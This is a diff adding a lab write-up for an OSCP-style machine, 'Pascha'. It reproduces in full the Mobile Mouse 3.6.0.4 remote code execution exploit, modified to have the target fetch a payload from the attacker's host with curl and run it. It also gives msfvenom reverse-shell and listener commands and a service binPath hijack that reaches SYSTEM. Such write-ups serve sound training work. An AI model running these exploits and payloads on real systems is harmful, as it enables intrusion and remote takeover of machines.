@@ -60,14 +60,172 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 {% endcode %}
 
+### Port 9099
 
+I have noticed a pattern with the standalone machines where one of them has some random port open and Googling "port x CVE" or "port x RCE" will turn up something that works. I decided to try this first with "[port 9099 RCE](https://www.google.com/search?q=port+9099+rce)" and sure enough, and [EDB 51010](https://www.exploit-db.com/exploits/51010).
 
 ## Foothold
 
+### EDB 51010
 
+I copy this to my directory and examine it. The code seems to automatically submit 2 commands via an RCE in remote mouse. The first command is a curl command which downloads a payload (`.exe`). The second just launches the downloaded payload. I made some modifications at line 41 to correct the download string for my particular web server configuration: switched to HTTPS with no certificate check (`-k`) and added the `/tmp/` directory to the path to allow me to host it in the `tmp` directory of my existing Apache server. Once these modifications were complete the exploit looked like this:
+
+{% code title="51010.py" lineNumbers="true" %}
+```python
+# Exploit Title: Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)
+# Date: Aug 09, 2022
+# Exploit Author: Chokri Hammedi
+# Vendor Homepage: https://mobilemouse.com/
+# Software Link: https://www.mobilemouse.com/downloads/setup.exe
+# Version: 3.6.0.4
+# Tested on: Windows 10 Enterprise LTSC Build 17763
+
+#!/usr/bin/env python3
+
+import socket
+from time import sleep
+import argparse
+
+help = " Mobile Mouse 3.6.0.4 Remote Code Execution "
+parser = argparse.ArgumentParser(description=help)
+parser.add_argument("--target", help="Target IP", required=True)
+parser.add_argument("--file", help="File name to Upload")
+parser.add_argument("--lhost", help="Your local IP", default="127.0.0.1")
+
+args = parser.parse_args()
+
+host = args.target
+command_shell = args.file
+lhost = args.lhost
+port = 9099 # Default Port
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+
+CONN = bytearray.fromhex("434F4E4E4543541E1E63686F6B726968616D6D6564691E6950686F6E651E321E321E04")
+s.send(CONN)
+run = s.recv(54)
+
+RUN = bytearray.fromhex("4b45591e3131341e721e4f505404")
+s.send(RUN)
+run = s.recv(54)
+
+sleep(0.5)
+
+download_string= f'curl.exe -k https://{lhost}/tmp/{command_shell} -o c:\Windows\Temp\{command_shell}'.encode('utf-8')
+hex_shell = download_string.hex()
+SHELL = bytearray.fromhex("4B45591E3130301E" + hex_shell + "1E04" +
+"4b45591e2d311e454e5445521e04")
+s.send(SHELL)
+shell = s.recv(96)
+
+print ("Executing The Command Shell...")
+
+sleep(1.2)
+RUN2 = bytearray.fromhex("4b45591e3131341e721e4f505404")
+s.send(RUN2)
+run2 = s.recv(54)
+
+shell_string= f"c:\Windows\Temp\{command_shell}".encode('utf-8')
+hex_run = shell_string.hex()
+RUN3 = bytearray.fromhex("4B45591E3130301E" + hex_run + "1E04" +
+"4b45591e2d311e454e5445521e04")
+s.send(RUN3)
+run3 = s.recv(96)
+
+print (" Take The Rose")
+
+sleep(10)
+s.close()
+```
+{% endcode %}
+
+I generate a payload with `msfvenom`:
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=135 -f exe -o rs.exe
+```
+{% endcode %}
+
+Once generated, I copy it to my apache server and start a listener:
+
+```bash
+rlwrap nc -lvnp 135
+```
+
+I then run the exploit and obtain a reverse shell:
+
+{% code overflow="wrap" %}
+```bash
+python3 51010.py --target pascha.oscp.exam --file rs.exe --lhost 192.168.45.157
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/OSC-PASCHA-F-ReverseShell.png" alt=""><figcaption><p>Obtaining a reverse shell with the exploit</p></figcaption></figure>
+
+User access achieved as `tim`.
 
 ## Privilege Escalation
 
+The first step I take is downloading PEAS and launching it:
 
+{% code overflow="wrap" %}
+```
+START /b peas.exe -a quiet log=tim.peas
+```
+{% endcode %}
 
-There is no post-exploit required for standalone exam machines.
+While this is running I start looking around manually.
+
+### Manual Enumeration
+
+#### EDB 51410
+
+As I start looking around I find a `MilleGPG` directory inside `C:\Program Files`. Not knowing what this is I Google it and find [EDB 51410](https://www.exploit-db.com/exploits/51410). This is a local privilege escalation that is caused by insecure file permissions:
+
+<figure><img src="../../../.gitbook/assets/OSC-PASCHA-PE-EDB51410.png" alt=""><figcaption><p>Writeup from EDB</p></figcaption></figure>
+
+The writeup implies that I can overwrite some critical binaries and hopefully escalate privileges that way. I spent awhile messing with this but I was unable to write to the member of this service family that was auto-starting:
+
+<div>
+
+<figure><img src="../../../.gitbook/assets/OSC-PASCHA-PE-AutoStartServices.png" alt=""><figcaption><p>Auto-start service</p></figcaption></figure>
+
+ 
+
+<figure><img src="../../../.gitbook/assets/OSC-PASCHA-PE-GPGOrchestrator_Icacls.png" alt=""><figcaption><p>icacls reveals only M</p></figcaption></figure>
+
+</div>
+
+There is also a MariaDB executable mentioned in the EDB writeup but I did not have access there either. I did manage to overwrite the main GUI binary at `C:\Program Files\MilleGPG5\MilleGPG5.exe` but I was unable to find a way to launch that binary as `Administrator`.
+
+### Service Binary Change
+
+At this point PEAS has finished so I open it up and in the output find another mention of this service saying I have full access to it:
+
+<figure><img src="../../../.gitbook/assets/OSC-PASCHA-PE-PEAS_ServiceModifiable.png" alt=""><figcaption><p>Mention of the service again</p></figcaption></figure>
+
+While I was messing around with EDB 51410 [above](pascha.md#edb-51410) I had tried stopping the GPGOrchestrator service to see if the service not running would allow me to overwrite its binary. It did not so I moved on. Now this has me wondering if I could just point the service at a different binary. I start by examining the service:
+
+```
+SC QC GPGOrchestrator
+```
+
+I do not learn much from this. I was mostly testing if I could use `SC`.
+
+During the course of my previous struggles I overwrote the real `C:\Program Files\MilleGPG5\MilleGPG5.exe` with a reverse shell that would reach back to my machine at port 139. I had confirmed the port was open and the shell worked. Now it is just a matter of getting it started as a service. I find [this SO post](https://stackoverflow.com/questions/7190480/modifying-the-path-to-executable-of-a-windows-service) which discusses resetting the path with `SC CONFIG`. With the command below I pointed the `GPGOrchestrator` service at my reverse shell binary (the overwritten `MilleGPG5.exe`):
+
+```
+SC CONFIG GPGOrchestrator binPath= "\"C:\Program Files\MilleGPG5\MilleGPG5.exe\""
+```
+
+* Note the use of the escape character in the quotes of the service binary path (`\"`)
+
+<figure><img src="../../../.gitbook/assets/OSC-PASCHA-PE-ResettingServiceBinPath.png" alt=""><figcaption><p>Resetting the binary for the service</p></figcaption></figure>
+
+With this having succeeded I could restart the machine but that takes awhile. Instead I just restart the service and launch my shell:
+
+<figure><img src="../../../.gitbook/assets/OSC-PASCHA-PE-SystemShell.png" alt=""><figcaption><p>SYSTEM access achieved</p></figcaption></figure>
+
+`SYSTEM` access achieved. There is no post-exploit required for standalone exam machines.
